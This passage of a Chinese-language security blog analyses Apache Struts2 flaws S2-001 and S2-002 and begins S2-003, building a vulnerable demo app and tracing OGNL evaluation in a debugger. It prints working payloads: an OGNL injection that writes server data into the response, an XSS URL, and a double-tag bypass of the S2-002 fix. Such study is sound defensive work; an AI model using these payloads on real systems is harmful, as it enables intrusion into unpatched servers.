xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">web-app</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Archetype Created Web Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>修改 src&#x2F;main&#x2F;webapp&#x2F;index.jsp 内容，利用 struts2 的标签 创建表单</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span><br>         pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%--引入标签库--%&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;s&quot;</span> uri=<span class="hljs-string">&quot;/struts-tags&quot;</span> %&gt;<br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;<br>    &lt;title&gt;S2-<span class="hljs-number">001</span>&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;S2-<span class="hljs-number">001</span> Demo&lt;/h2&gt;<br>&lt;p&gt;link: &lt;a href=<span class="hljs-string">&quot;https://cwiki.apache.org/confluence/display/WW/S2-001&quot;</span>&gt;https:<span class="hljs-comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span><br>&lt;s:form action=<span class="hljs-string">&quot;login&quot;</span>&gt;<br>    &lt;s:textfield name=<span class="hljs-string">&quot;username&quot;</span> label=<span class="hljs-string">&quot;username&quot;</span> /&gt;<br>    &lt;s:textfield name=<span class="hljs-string">&quot;password&quot;</span> label=<span class="hljs-string">&quot;password&quot;</span> /&gt;<br>    &lt;s:submit&gt;&lt;/s:submit&gt;<br>&lt;/s:form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>接着在 webapp 下 创建 hello.jsp 文件，用来做结果跳转页面</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span><br>         pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;s&quot;</span> uri=<span class="hljs-string">&quot;/struts-tags&quot;</span> %&gt;<br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;<br>    &lt;title&gt;S2-hello&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;p&gt;Hello &lt;s:property value=<span class="hljs-string">&quot;username&quot;</span>&gt;&lt;/s:property&gt;&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>在 main&#x2F;java 下 创建 com.lingx5.loginAction 的 java 类文件，用来处理请求</p><blockquote><p>struts2 适用 action 来处理请求的，功能类似于 servlet</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginAction</span>  &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUsername</span><span class="hljs-params">(String username)</span> &#123;<br>        <span class="hljs-built_in">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">login</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.username.isEmpty()) || (<span class="hljs-built_in">this</span>.password.isEmpty())) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.username.equals(<span class="hljs-string">&quot;admin&quot;</span>)) &amp;&amp; (<span class="hljs-built_in">this</span>.password.equals(<span class="hljs-string">&quot;admin&quot;</span>))) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>有处理请求的 action 和 发送请求的页面 index.jsp 了，怎么把他俩给映射起来呢？</p><p>创建 <code>src/main/resources/struts.xml</code> 配置文件，用来把 action 和 jsp 做映射</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">struts</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;default&quot;</span>  <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--        action的name属性是访问路径， method指拦截请求后要执行的方法--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.lingx5.action.LoginAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;login&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--            result是 根据action类的返回值 跳转不同的 jsp页面--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/hello.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>整体的项目结构</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407143216436.png" alt="image-20250407143216436" style="zoom:67%;" /><p>我们启动项目</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407133753074.png" alt="image-20250407133753074" style="zoom:67%;" /><p>可以登录一下 输入 <code>admin:admin</code> </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407144320996.png" alt="image-20250407144320996"></p><p>登录成功，现在这个漏洞项目就搭建好了</p><p>说一下具体的执行流程</p><p>用户访问 index.jsp 首页，输入 username 和 password 点击 submit 提交，表单设置的 <code>action=&quot;login&quot;</code> , struts2 会去从 struts.xml 文件需找 login 的 action ，执行 LoginAction 对应的方法 根据返回结果 返回 struts.xml 中 对应的 jsp 页面</p><p>这就是最基本的访问流程</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们在 password 输入 <code>%&#123;2+2&#125;</code> </p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407145041981.png" alt="image-20250407145041981" style="zoom:50%;" /><p>点击 submit 后</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407145131640.png" alt="image-20250407145131640" style="zoom:50%;" /><p>执行了</p><p>我们看看他是如何解析执行的</p><p>我们收来来到 struts2 的标签解析的方法，在定义的标签上，ctrl 左键</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407161432059.png" alt="image-20250407161432059"></p><p>看到是由 org.apache.struts2.views.jsp.ui.TextFieldTag 做的解析</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407161542410.png" alt="image-20250407161542410"></p><p>我们来看一下这个类，勾上继承，可以查看继承的父类方法</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407161725115.png" alt="image-20250407161725115" style="zoom:67%;" /><p>发现他继承了 ComponentTagSupport#doStartTag 和 ComponentTagSupport#doEndTag 方法，顾名思义这两个方法肯定就是标签开始解析，和标签结束解析的方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407161929328.png" alt="image-20250407161929328"></p><p>我们在 doEndTag 下断点</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407162137437.png" alt="image-20250407162137437"></p><p>同样在 password 的标签发送 %{2+2} 这个 ognl 表达式</p><p>我们拦截道 password 的标签</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407162612306.png" alt="image-20250407162612306"></p><p>步入这个 end 方法，来到 UIBean#end 方法，调用了 evaluateParams() 方法，名字也可以看出来 <code>评估参数</code></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407162716484.png" alt="image-20250407162716484"></p><p>步入，一直往下走，我们会来到 findValue() 方法，解析 ognl 表达式</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407163911653.png" alt="image-20250407163911653"></p><p>我们进入看看这个方法是如何解析 ognl 表达式的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407164215119.png" alt="image-20250407164215119"></p><p>我们步入 TextParseUtil.translateVariables() 方法，可以看到这个方法写了一个死循环，也就是说只要是 ognl 表达式，他就会循环解析，<strong>他还没有做过滤，这就给我们 ognl 注入提供了条件</strong></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407164331838.png" alt="image-20250407164331838"></p><p>我们现在还是 <code>%&#123;password&#125;</code> ，肯定是要先去获取我们在输入框里 传的值：<code>%&#123;2+2&#125;</code> 继续往下走</p><p>看到经过处理后 从 stack 中 找 password 对应的值了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407171033540.png" alt="image-20250407171033540"></p><p>一步步跟，看到他 在 ognl.ASTProperty#getValueBody 方法中 拿到了 password 对应的字段值</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407170252577.png" alt="image-20250407170252577"></p><p>调用栈</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">93</span>, ASTProperty (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">170</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">210</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">333</span>, Ognl (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">194</span>, OgnlUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">findValue:</span><span class="hljs-number">238</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">translateVariables:</span><span class="hljs-number">122</span>, TextParseUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">translateVariables:</span><span class="hljs-number">71</span>, TextParseUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">findValue:</span><span class="hljs-number">313</span>, Component (org.apache.struts2.components)<br><span class="hljs-symbol">evaluateParams:</span><span class="hljs-number">723</span>, UIBean (org.apache.struts2.components)<br><span class="hljs-symbol">end:</span><span class="hljs-number">481</span>, UIBean (org.apache.struts2.components)<br><span class="hljs-symbol">doEndTag:</span><span class="hljs-number">43</span>, ComponentTagSupport (org.apache.struts2.views.jsp)<br></code></pre></td></tr></table></figure><p>我们拿到 <code>%&#123;2+2&#125;</code> 了</p><p>一路弹栈，来到最初的 <code>TextParseUtil#translateVariables</code> 的死循环解析中，下次循环就开始解析  <code>%&#123;2+2&#125;</code>  这个 ognl 表达式了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407171313020.png" alt="image-20250407171313020"></p><p>看到在 ognl.Ognl#getValue() 方法中 <code>“2+2”</code> 这个表达式已经被抽象成 ASTAdd 这个语法树了, 此时执行 getValue() 方法，就是执行加法了</p><blockquote><p>这里抽象语法树的类型有很多，每种都有自己的实现，以完成 ognl 不同的功能</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407183948085.png" alt="image-20250407183948085" style="zoom:50%;" /></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407181821213.png" alt="image-20250407181821213"></p><p>跟如</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407183201335.png" alt="image-20250407183201335"></p><blockquote><p>注意 ognl 对执行过得表达式，会进行缓存，尝试重启服务清理缓存就会跟到这里了</p></blockquote><p>然后就是回显，利用 UIBean 这个类，添加 name value 进行回显</p><p> 一路弹栈，回到 UIBean 执行 addParameter()</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407184330379.png" alt="image-20250407184330379"></p><p>然后调用 mergeTemplate 完成回显</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407184522019.png" alt="image-20250407184522019"></p><p>当然，我们也可以利用 ognl 表达式，主动解析回显，利用 HttpServletResponse 写回页面即可</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsp">%&#123;<br>#writer=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),<br>#writer.println(<span class="hljs-meta">@java</span>.lang.System<span class="hljs-meta">@getProperty(&quot;user.dir&quot;)</span>),<br>#writer.flush(),<br>#writer.close()<br>&#125;<br></code></pre></td></tr></table></figure><p>成功回显</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407185415274.png" alt="image-20250407185415274" style="zoom: 67%;" /><h2 id="s2-002"><a href="#s2-002" class="headerlink" title="s2-002"></a>s2-002</h2><p><code>Struts2-002</code> 是一个 <code>XSS</code> 漏洞，该漏洞发生在 <code>s:url</code> 和 <code>s:a</code> 标签中，当标签的属性 <code>includeParams=all</code> 时，即可触发该漏洞。</p><p>漏洞影响版本： <code>Struts 2.0.0 - Struts 2.1.8.1</code> 。更多详情可参考官方通告：<br><a href="https://cwiki.apache.org/confluence/display/WW/S2-002">https://cwiki.apache.org/confluence/display/WW/S2-002</a></p><p>启动项目</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407201025542.png" alt="image-20250407201025542" style="zoom:50%;" /><p>访问</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://localhost:8080/S002/login.action?<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>触发 xss</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407201157202.png" alt="image-20250407201157202" style="zoom:33%;" /><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>依然会在 ComponentTagSupport#doStartTag 和 doEndTag 解析标签，我们在 doStartTag 打断点，看他是如何造成 xss 的</p><p>我们是从 urlTag 类，执行的父类方法的 doStartTag </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407210625744.png" alt="image-20250407210625744"></p><p>会调用 start 我们步入，会看到为什么漏洞要求 includeParams 为 all</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407210842109.png" alt="image-20250407210842109"></p><p>我们步入 mergeRequestParameters，看到它获取到了我们传入的 payload，并存放在了 parameters 表中</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407211040359.png" alt="image-20250407211040359"></p><p>下面会执行 includeGetParameters，我们同样会调用到 mergeRequestParameters</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407211352524.png" alt="image-20250407211352524"></p><p>存放了一个进行 url 编码的 payload</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407211431190.png" alt="image-20250407211431190"></p><p>最后的 includeExtraParameters 为 null</p><p>之后就来到了 doStartTag 的 return</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407212043371.png" alt="image-20250407212043371"></p><blockquote><ul><li><strong>0</strong>：对应 Tag.SKIP_BODY，表示跳过标签主体，不对其进行处理。</li><li><strong>1</strong>：对应 Tag.EVAL_BODY_INCLUDE，表示评估标签主体并将其直接包含到输出中。</li><li><strong>2</strong>：对应 BodyTag.EVAL_BODY_BUFFERED，表示评估标签主体并将其缓冲起来，以便后续处理（仅适用于实现了 BodyTag 接口的标签）。</li></ul></blockquote><p>我们接着看 doEndTag 是如何进行处理的</p><p>我们回跳转到 org.apache.struts2.components.URL#end 方法 会调用 determineActionURL 来获取 url</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407212804951.png" alt="image-20250407212804951"></p><p>result 会包含 payload，然后 调用 writer.write 写回页面，</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407213347328.png" alt="image-20250407213347328"></p><p>浏览器页面解析 触发 xss</p><p>执行完成之后</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407213854573.png" alt="image-20250407213854573"></p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>后续的修复也挺水的</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">result = link.toString(); result.indexOf(<span class="hljs-string">&quot;&lt;script&gt;&quot;</span>) &gt; <span class="hljs-number">0</span>; result = result.replaceAll(<span class="hljs-string">&quot;&lt;script&gt;&quot;</span>, <span class="hljs-string">&quot;script&quot;</span>)) <br></code></pre></td></tr></table></figure><p>这个可以轻松 双写绕过 <code>&lt;&lt;script&gt;&gt;</code> </p><h2 id="S2-003"><a href="#S2-003" class="headerlink" title="S2-003"></a>S2-003</h2><p>这是又爆出来的 RCE 漏洞，这个漏洞主要是参数名使用了 ognl 解析</p><p>影响版本：Struts 2.0.0 - Struts 2.1.8.1<br>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-003">S2-003 - Apache Struts 2 Wiki - Apache Software Foundation</a></p><p>这个要在 tomcat6 下，而且不需要 struts 标签，只需要一个 action 类即可</p><p>主要是 struts2 在 调用 com.opensymphony.xwork2.interceptor.ParametersInterceptor 拦截器时，解析参数名的 ognl 导致的</p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们先来看看 ParametersInterceptor 这个类，做了那些事情</p><p>首先关注的肯定就是 setParameters 这个主要来解析我们参数的方法</p><h3 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h3><blockquote><p>但这并不是我们的入口函数，入口是拦截器的 ParametersInterceptor#intercept 这个方法，他经过判断调用了 setParameters 后边在讲</p></blockquote><p>首先给个正常的参数值 lingx5 &#x3D; 1</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408101743208.png" alt="image-20250408101743208" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParameters</span><span class="hljs-params">(Object action, ValueStack stack, Map parameters)</span> &#123;<br>    <span class="hljs-type">ParameterNameAware</span> <span class="hljs-variable">parameterNameAware</span> <span class="hljs-operator">=</span> action <span class="hljs-keyword">instanceof</span> ParameterNameAware ? (ParameterNameAware)action : <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.ordered) &#123;<br>        params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>(<span class="hljs-built_in">this</span>.getOrderedComparator());<br>        params.putAll(parameters);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>(parameters);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(Map.Entry entry : params.entrySet()) &#123;<br>        <span class="hljs-comment">// 把参数名 转为字符串，赋给name变量</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> entry.getKey().toString();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">acceptableName</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.acceptableName(name) &amp;&amp; (parameterNameAware == <span class="hljs-literal">null</span> || parameterNameAware.acceptableParameterName(name));<br>        <span class="hljs-keyword">if</span> (acceptableName) &#123;<br>            <span class="hljs-comment">// 获得传递参数的值，也就是name的值</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> entry.getValue();<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 把名字和值，存放到 stack中，我们要去看，这个方法是如何执行的</span><br>                stack.setValue(name, value);<br>            &#125; <span class="hljs-keyword">catch</span> (RuntimeException e) &#123;<br>                <span class="hljs-keyword">if</span> (devMode) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">developerNotification</span> <span class="hljs-operator">=</span> LocalizedTextUtil.findText(ParametersInterceptor.class, <span class="hljs-string">&quot;devmode.notification&quot;</span>, ActionContext.getContext().getLocale(), <span class="hljs-string">&quot;Developer Notification:\n&#123;0&#125;&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;e.getMessage()&#125;);<br>                    LOG.error(developerNotification);<br>                    <span class="hljs-keyword">if</span> (action <span class="hljs-keyword">instanceof</span> ValidationAware) &#123;<br>                        ((ValidationAware)action).addActionMessage(developerNotification);<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    LOG.error(<span class="hljs-string">&quot;ParametersInterceptor - [setParameters]: Unexpected Exception catched: &quot;</span> + e.getMessage());<br>                &#125;<br>            &#125;<br>        &#125;<br>    